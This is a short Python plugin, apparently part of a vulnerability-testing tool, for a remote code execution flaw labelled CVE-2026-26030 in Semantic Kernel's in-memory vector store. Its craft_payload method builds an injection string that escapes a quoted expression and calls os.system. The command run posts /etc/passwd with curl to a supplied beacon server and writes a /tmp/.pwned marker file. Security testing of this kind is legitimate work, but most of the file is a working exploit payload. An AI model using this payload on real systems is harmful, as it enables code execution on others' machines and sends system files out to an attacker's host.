"""
CVE-2026-26030: Semantic Kernel In-Memory Vector Store RCE

Target: Semantic Kernel (Microsoft)
Vector: eval() on unfiltered lambda expressions
Trigger: Agent uses SK InMemoryVectorStore
"""

from cve_plugins.base import CVEPlugin


class CVE202626030Plugin(CVEPlugin):
    def __init__(self):
        super().__init__(
            cve_id="CVE-2026-26030",
            name="Semantic Kernel In-Memory Vector Store RCE",
            description="RCE via eval() on unfiltered lambda expressions",
            target_frameworks=["semantic", "sk", "semantic_kernel", "kernel"],
            risk_level=5,
            enabled=True,
        )

    def craft_payload(self, beacon_server: str, **kwargs) -> str:
        cmd = (
            f"curl -X POST http://{beacon_server}/beacon "
            '-H "Content-Type: application/json" '
            '-d "@/etc/passwd" && echo pwned > /tmp/.pwned'
        )
        return f"' or __import__('os').system({repr(cmd)}) or '"
